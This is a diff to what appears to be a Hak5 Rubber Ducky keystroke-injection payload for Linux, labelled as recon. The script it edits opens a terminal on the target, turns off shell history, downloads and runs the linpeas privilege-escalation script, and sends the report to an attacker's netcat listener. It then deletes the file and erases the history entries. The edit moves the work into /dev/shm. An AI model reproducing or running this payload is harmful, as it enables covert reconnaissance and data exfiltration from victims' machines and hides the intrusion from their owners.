@@ -4,7 +4,7 @@ REM Target:  Unix-like tested on kubuntu 22.04
 REM Props: Hak5, 0iphor13 for pointing me towards netcat an other advice, strippers and memes
 REM Version: 1.0
 REM Category: Recon
-REM Launches terminal, turns off history, launches linpeas in background, uploads the report to your nc listener, covers tracks and exits. Best viewing of report is to view it in the terminal.
+REM Launches terminal, turns off history, launches linpeas in background, uploads the report to your nc listener, covers tracks and exits. Best viewing of report is less -r treasure.txt
 REM
 REM initialization delay
 DELAY 300
@@ -18,7 +18,7 @@ STRING set +o history
 DELAY 300
 ENTER
 REM launch recon and exfil then cover your tracks
-STRING nohup curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh | bash >treasure.txt && nc "receiving.host.ip" "port" < treasure.txt >/dev/null && rm treasure.txt && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history &
+STRING cd /dev/shm && nohup curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh | bash >treasure.txt && nc "receiving.host.ip" "port" < treasure.txt >/dev/null && rm treasure.txt && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history &
 DELAY 500
 ENTER
 DELAY 300
